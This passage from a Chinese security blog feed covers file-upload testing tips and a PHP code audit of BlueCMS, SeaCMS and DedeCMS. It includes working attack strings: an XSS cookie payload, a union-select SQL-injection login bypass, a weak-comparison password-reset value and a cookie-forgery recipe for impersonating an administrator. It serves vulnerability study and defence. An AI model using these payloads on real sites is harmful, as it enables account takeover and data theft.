href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>因为传上去的文件，如图片这类的总归是显示出来的，所以可以先在web应用到处点点，多加载一些数据包，然后再到burp的http history搜索shell的名字</p></li><li><p><strong>返回了一些参数但不包括路径的情况</strong>，比如file_id 等等，那么文件路径可能存储在数据库中，可以<strong>结合sql注入</strong> sqlmap的–search -C参数找到字段和值</p></li><li><p><strong>什么都没返回的情况，只返回了ok，true等等。重新加载，抓包看响应，或许某个接口的响应就包括对应的路径。</strong></p><p>比如头像位置上传上去了，但是没有返回路径，那么想办法让他在加载一遍，比如退出重新登陆，一个包一个包的放。可能有些包的响应中就包含路径。</p><p>   另外可能存在其他服务器、或者其他站点的其他路径，也是抓包查看，看一下加载过程的路径在哪或者看一下html、js</p><p>[<img src="/../images/1964477-20210910165949941-1026982801.png" alt="img"></p></li><li><p><strong>尝试访问日志文件，看能否发现一些敏感目录或上传目录</strong></p></li><li><p><strong>只返回了文件名，没有路径</strong></p><p>一种是fuzz，看其他同类型文件的路径，f12或者如果有文件下载的地方，下载抓包，看文件地址。</p><p>另一种是 尝试上传的时候<strong>目录穿越</strong>，一次一次尝试，看能否<strong>穿到站点根目录</strong>或者<strong>知道的目录下面</strong>。修改表单的其他参数、或者filename参数的值</p></li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>白名单机制</p></li><li><p>上传文件重命名</p></li><li><p>隐藏上传文件路径</p></li><li><p>文件内容校验和过滤</p></li><li><p>避免条件竞争，先判断是否合法，而不是先将文件写入再判断是否合法</p></li><li><p>上传的文件统一放到一个地方，遵循以下原则</p><p><code>目录可写但不可解析，可解析但不可写入</code></p><p>或者上传到专门用来保存文件的地方，如存储OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>函数集文件，通常命名包含function或者common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li><li>配置文件，通常命名中包括config关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是单引号还是用双引号括起来，如果是双引号可能就存在代码执行的问题了。</li><li>安全过滤文件，安全过滤文件对代码审计至关重要，这关系到我们挖掘到的可以点能否直接利用，通常命名中带有filter、safe、check等关键字，这类文件主要是对参数进行过滤，大多数的应用其实会在参数的输入做一下addslashes()函数的过滤。</li><li>index文件，index是一个程序的入口，所以通常我们只要读一读index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件有哪些。而不同目录的index文件也有不同的实现方式，建议最好将几个核心目录的index文件都通读一遍。</li></ul><h1 id="总结大致流程"><a href="#总结大致流程" class="headerlink" title="总结大致流程"></a>总结大致流程</h1><p><strong>1、先全局总览：入口文件、路由、全局处理方式等</strong><br><strong>2、定向功能审计：黑盒(找到敏感功能)+白盒（定位到代码进行审计）</strong><br><strong>3、敏感函数回溯</strong></p><p>先黑盒+白盒看敏感功能，再用自动化审计工具跑一遍并验证，最后再根据漏洞危险函数去回溯</p><h3 id="自动化审计工具"><a href="#自动化审计工具" class="headerlink" title="自动化审计工具"></a>自动化审计工具</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h4 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h4><p>在注册时，邮箱插入xss代码</p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>上传文件，只允许上传图片后缀的文件，上传后有给出图片路径，那么不能配合.htaccess，需要找到一个文件包含的点来包含文件。</p><img src="E:\typora img\image-20221202121559453.png" alt="image-20221202121559453" style="zoom:80%;" /><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><p>是否存在越权,测试了没有</p><h4 id="发布新闻"><a href="#发布新闻" class="headerlink" title="发布新闻"></a>发布新闻</h4><img src="E:\typora img\image-20221202122851275.png" alt="image-20221202122851275" style="zoom:67%;" /><p>这里分类选择不了，应该是要管理员发布。</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>管理员</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>其他</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>这里没有验证码验证，那么可以很轻松地进行爆破，得到usernmae&#x3D;admin，passwd&#x3D;admin</p><img src="E:\typora img\image-20221202124055555.png" alt="image-20221202124055555" style="zoom:67%;" /><p>进去之后，可以看到一个建议，install文件夹，上面通过dirsearch也扫描出了这个文件，如果我们可以使用这个文件夹来重新安装网站，那么我们就可以直接重置管理员了，可惜是不可以的。</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h4><p>发布本地新闻这里存在一个文件上传操作，但是也只能上传图片</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="会员管理"><a href="#会员管理" class="headerlink" title="会员管理"></a>会员管理</h4><p>可以发现触发了之前的xss，那么如果我们没有登陆上后台，也可以通过这个xss来🎣获取管理员的cookie。</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>也可以修改管理员密码，而且没有任何验证，可以直接修改。。</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><p>先看一下目录</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p>先看一下前台的index.php，内容差不多就是渲染页面，没有用户可控的参数，所以关注其包含的其他文件。</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>跟进common.inc.php看一下</p><p>关键部分，用来验证用户身份，其中cookie中的参数是可控的。</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>先判断cookie中是否有user_id，有的话再继续判断user_name和user_pwd是否存在，如果存在就check_cookie，如果只有user_name存在就查询名字是否只有一个，其他情况set_cookie。</p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>跟进check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>查username对应的密码，经过散列处理判断密码是否正确。</p><p>跟进getone–在include&#x2F;mysql.class.php中</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" alt="image-20221202185616902"></p><p>可以看到没有对sql语句做任何处理，直接用mysql_query进行查询，sql语句错误时，返回错误消息Query error，然后是前面加了一个@，所以不能用报错注入。</p><p>再观察include&#x2F;mysql.class.php可以发现</p><img src="E:\typora img\image-20221202190550614.png" alt="image-20221202190550614" style="zoom:80%;" /><p>发现存在宽字节注入，那么这个CMS就可以随便注入了。。。（因为所有的sql操作都是用这个mysql类）</p><p>以ad_js.php为例</p><img src="E:\typora img\image-20221202190230473.png" alt="image-20221202190230473" style="zoom:80%;" /><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h4><p>虽然有白名单限制，只能上传图片，但是没有对文件内容进行过滤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>并且在user.php中，没有对$_POST[‘pay’]进行过滤，存在目录穿越，就可以包含上传的用户头像。</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>​<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>需要先插入一条新闻，新闻名为要删除的文件的路径。</p><h3 id="后台–-x2F-admin"><a href="#后台–-x2F-admin" class="headerlink" title="后台–&#x2F;admin"></a>后台–&#x2F;admin</h3><p>还是先看一下index.php，也是只是输出了CMS和系统的一些信息，所以关注其包含的文件</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>关键内容</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>对输入的参数都使用addslashes()进行转义,不过还有<code>$SERVER</code>没有进行处理。</p><img src="E:\typora img\image-20221202192459456.png" alt="image-20221202192459456" style="zoom:80%;" /><p>​使用session来验证admin身份。还是一样的使用check_cookie来判断，</p><p>​<img src="E:\typora img\image-20221202140225964.png" alt="image-20221202140225964" style="zoom:80%;" /></p><p>​需要得到admin的pwd和cookie_hash，这两个都在数据库中，可以利用前台的sql注入获得，所以可以通过这个来登录admin用户。</p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><img src="E:\typora img\image-20221202191243192.png" alt="image-20221202191243192" style="zoom:80%;" /><img src="E:\typora img\image-20221202191403061.png" alt="image-20221202191403061" style="zoom: 80%;" /><p>文件路径只作了去除头尾空格的处理，存在目录穿越；文件内容实际上是调用了stripslashes，并没有过滤。</p><p>测试</p><img src="E:\typora img\image-20221202194248639.png" alt="image-20221202194248639" style="zoom:80%;" /><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个CMS还是比较简单的，因为几乎没有过滤。</p><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>网站架构，无框架，目录结构如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">├─admin   <span class="comment"># 后台</span></span><br><span class="line">├─css  <span class="comment"># 存放css文件</span></span><br><span class="line">├─files  <span class="comment"># 存放页面</span></span><br><span class="line">├─images  <span class="comment"># 存放图片</span></span><br><span class="line">├─inc  <span class="comment"># 存放网站配置，校验，过滤文件</span></span><br><span class="line">├─install <span class="comment"># 网站安装</span></span><br><span class="line">├─seacmseditor <span class="comment"># 网站编辑器</span></span><br><span class="line">├─template <span class="comment"># 网站模板</span></span><br><span class="line">└─upload   <span class="comment"># 存放上传文件</span></span><br></pre></td></tr></table></figure><h2 id="查看入口文件"><a href="#查看入口文件" class="headerlink" title="查看入口文件"></a>查看入口文件</h2><p>所有的入口都是通过传递r参数来分发路由，对应files目录中的文件</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>这里只用<code>addslashes</code>进行了转义，明显路径穿越+文件包含</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>其他思路</p><ul><li><p>如果是linux系统，也可以通过<code>pearcmd.php</code>来getshell</p><blockquote><p>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</p></blockquote></li><li><p>尝试%00截断路径，造成任意文件读取，不知道为啥失败了，环境：php5.3.29，<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制</p></li></ul><h2 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h2><p>通过install目录下的InstallLock.txt是否存在来判断是否安装，如果可以删除该文件，就可以配合入口文件的文件包含漏洞来重新安装网站。</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>数据库编码为<code>utf-8</code>，不存在宽字节注入</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="查看身份校验文件"><a href="#查看身份校验文件" class="headerlink" title="查看身份校验文件"></a>查看身份校验文件</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>垂直越权，只要在cookie中加入user值</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="前台-1"><a href="#前台-1" class="headerlink" title="前台"></a>前台</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>使用<code>addslashes</code>来过滤，逃逸不了引号，所以不存在sql注入</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sql都用了<code>addslashes</code>来过滤</p><p>但是存在xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>存在数字型终于可以注入了，配合<code>mysql_error</code>进行报错注入</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>因为验证码正确后也不刷新，所以可以使用同一个验证码进行注入</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>存储xss</p><p>过滤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>但是还是可以在name处保存</p><p>输出点</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><h3 id="后台登录-1"><a href="#后台登录-1" class="headerlink" title="后台登录"></a>后台登录</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>没有过滤，可以使用联合查询构造临时用户数据登录,或者报错注入拿到密码后解密登录</p><p>判断字段数</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>确定用户名，密码字段位置</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>联合查询登陆</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="文件上传处"><a href="#文件上传处" class="headerlink" title="文件上传处"></a>文件上传处</h3><p><code>up.class.php</code></p><p>白名单，文件大小检测，文件时间戳重命名,图片裁剪生成缩略图</p><p>没啥用，需要配合其他漏洞</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>进行功能点审计</p><h2 id="全局总览"><a href="#全局总览" class="headerlink" title="全局总览"></a>全局总览</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">入口文件主要有三个</span><br><span class="line">前台</span><br><span class="line">后台：dede/</span><br><span class="line">会员：member/</span><br></pre></td></tr></table></figure><p>全局函数<br>在项目根目录的index文件包含的&#x2F;include&#x2F;common.inc.php中<br>过滤的：</p><p>检查和注册外部提交的变量，<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>文件上传的</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>分页参数的</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>函数集</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>过滤不文明内容的😅，不是为了防御漏洞的</p><h2 id="文件上传功能点"><a href="#文件上传功能点" class="headerlink" title="文件上传功能点"></a>文件上传功能点</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>实际上是调用了<code>upload.helper.php</code>中的<code>AdminUpload</code>方法</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>可以看到只对文件的MIME类型进行了校验,没有对文件后缀进行校验</p><p>再看一下全局防护<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>虽然有黑名单，但是黑名单对管理员用户无效</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>最后用<code>getimagesize</code>进行校验，可以添加文件头绕过。</p><p>综上所属，是管理员身份，只需要修改MIME和文件头即可绕过过滤。</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>跟上一个差不多，只校验MIME，不校验后缀，只是多了一步加水印的，所以传一个php后缀的图片马</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>没有对内容进行过滤，这里可以写🐎</p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>压根不存在，没有过滤，对url先进行base64加密，再进行url加密即可</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="会员任意密码修改"><a href="#会员任意密码修改" class="headerlink" title="会员任意密码修改"></a>会员任意密码修改</h2><p>先看一下会员中心的逻辑</p><p><code>member/index.php</code></p><p>校验用户是否登录，登录则进入会员个人中心</p><p><code>member/index_do.php</code></p><p>会员操作与<code>$fmdo</code>参数匹配</p><p>重置密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>重置密码逻辑在<code>resetpassword.php</code>中,大致逻辑如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第一步</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 密码问题判断</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第二步</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注密码问题判断</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>使用了弱比较，如果用户没有设置密码问题，默认值如下</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>所以可以构造<code>safequestion=0.0&amp;safeanswer=</code>来进入该if语句</p><p>跟进 sn，最终是重定向到修改密码页面</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h2><p>看一下怎么处理的</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>跟进</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>对得到的<code>M_ID</code>做了<code>intval</code>处理，最后根据<code>M_ID</code>的值从数据库中取出对应用户</p><p>跟进<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>跟进<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>两个IF，第一个if判断Cookie中的DedeUserID和DedeUserID__ckMD5,如果都存在进入第二个if，校验cookie有效性，可以看到是通过加盐再加密的方式，所以按理说是无法伪造cookie的。</p><p>但是可以从<code>/member/index.php</code>可以来获取这个加密后的值</p><p>搜索<code>getcookie</code>得到</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>跟踪<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>如果<code>$last_vid</code>为空，那么将<code>$uid</code>赋值给<code>$last_vid</code>，并作为参数传递给<code>PutCookie</code>函数</p><p>跟进<code>PutCookie</code>函数</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>可以看到跟登录的<code>getcookie</code>加密方式一样。</p><p>总结一下：</p><p>登录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用户的身份由DedeUserID的值来决定</span><br><span class="line"></span><br><span class="line">校验：DedeUserID__ckMd5的值和<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>访问<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>所以让</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>就可以绕过getcookie的校验，但是还有一个问题是<code>uid</code>指的是用户的<code>userid</code>，<code>DedeUserID</code>指的是用户的<code>mid</code>，所以要让<code>uid</code>为<code>mid</code>才可以伪造身份</p><p><img src="/../images/image-20230526134001725-1686141975691.png" alt="image-20230526134001725"></p><p>还记得上面的处理吗？</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>所以只需要构造一个含有数字1的字符串就可以伪造admin的身份。</p><p>注册一个用户名为1admin的用户</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>将 <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json 文件的 require 字段设置成如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>将其放置到网站目录下，访问<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>推荐阅读<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="路由和参数传递"><a href="#路由和参数传递" class="headerlink" title="路由和参数传递"></a>路由和参数传递</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/模块/控制器/操作/[参数名/参数值...] # pathinfo模式</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # 兼容方式</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>如控制器Index：<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span 